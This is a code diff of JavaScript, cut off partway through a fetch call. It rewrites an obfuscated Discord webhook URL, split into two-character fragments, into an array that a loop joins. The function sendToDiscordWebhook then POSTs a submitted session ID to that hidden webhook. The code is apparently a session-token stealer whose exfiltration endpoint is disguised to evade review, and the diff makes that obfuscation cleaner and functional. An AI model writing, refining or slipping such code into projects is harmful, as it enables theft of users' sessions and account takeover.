@@ -1,72 +1,22 @@
-const _0x1a2b = 'ht';
-const _0x3c4d = 'tp';
-const _0x5e6f = 's:/';
-const _0x7a8b = '/di';
-const _0x9c0d = 'sc';
-const _0x0d1e = 'or';
-const _0x2e3f = 'd.';
-const _0x4f5g = 'co';
-const _0x6h7i = 'm/';
-const _0x8j9k = 'ap';
-const _0x0k1l = 'i/';
-const _0x2m3n = 'we';
-const _0x4o5p = 'bh';
-const _0x6q7r = 'oo';
-const _0x8s9t = 'ks';
-const _0x1u2v = '/1';
-const _0x3w4x = '35';
-const _0x5y6z = '02';
-const _0x7a8b = '35';
-const _0x9c0d = '35';
-const _0x0d1e = '13';
-const _0x2e3f = '39';
-const _0x4f5g = '24';
-const _0x6h7i = '14';
-const _0x8j9k = '72';
-const _0x0k1l = '/L';
-const _0x2m3n = 'wc';
-const _0x4o5p = 'Yu';
-const _0x6q7r = 'oF';
-const _0x8s9t = 'mS';
-const _0x1u2v = 'DC';
-const _0x3w4x = 'C4';
-const _0x5y6z = 'pA';
-const _0x7a8b = 'Ho';
-const _0x9c0d = 'Z5';
-const _0x0d1e = 'Kd';
-const _0x2e3f = 'n0';
-const _0x4f5g = 'a3';
-const _0x6h7i = 'af';
-const _0x8j9k = 'Ue';
-const _0x0k1l = 'rP';
-const _0x2m3n = 'Qe';
-const _0x4o5p = 'XN';
-const _0x6q7r = 'xq';
-const _0x8s9t = '8b';
-const _0x1u2v = 'xZ';
-const _0x3w4x = 'dS';
-const _0x5y6z = 'rL';
-const _0x7a8b = 'oB';
-const _0x9c0d = 'UP';
-const _0x0d1e = 'ab';
-const _0x2e3f = '1p';
-const _0x4f5g = 'WM';
-const _0x6h7i = 'tO';
-const _0x8j9k = 'TY';
-const _0x0k1l = 'zc';
-const _0x2m3n = 'Iq';
-const _0x4o5p = 'nG';
-const _0x6q7r = 'zK';
-const _0x8s9t = 'Q';
+const _encryptedParts = [
+  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+  'oo', 'ks', '/1', '35', '02', '35', '35', '13', '39', '24', '14', '72', '/L', 
+  'wc', 'Yu', 'oF', 'mS', 'DC', 'C4', 'pA', 'Ho', 'Z5', 'Kd', 'n0', 'a3', 'af', 
+  'Ue', 'rP', 'Qe', 'XN', 'xq', '8b', 'xZ', 'dS', 'rL', 'oB', 'UP', 'ab', '1p', 
+  'WM', 'tO', 'TY', 'zc', 'Iq', 'nG', 'zK', 'Q'
+];
 
-const _bob = _0x1a2b + _0x3c4d + _0x5e6f + _0x7a8b + _0x9c0d + _0x0d1e + _0x2e3f + _0x4f5g + _0x6h7i + _0x8j9k + _0x0k1l + _0x2m3n + _0x4o5p + _0x6q7r + _0x8s9t + _0x1u2v + _0x3w4x + _0x5y6z + _0x7a8b + _0x9c0d + _0x0d1e + _0x2e3f + _0x4f5g + _0x6h7i;
+let bruteforce = '';
+for (let i = 0; i < _encryptedParts.length; i++) {
+  bruteforce += _encryptedParts[i];
+}
 
 function sendToDiscordWebhook(sessionId) {
   const payload = {
     content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``,
   };
 
-  fetch(_bob, {
+  fetch(bruteforce, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
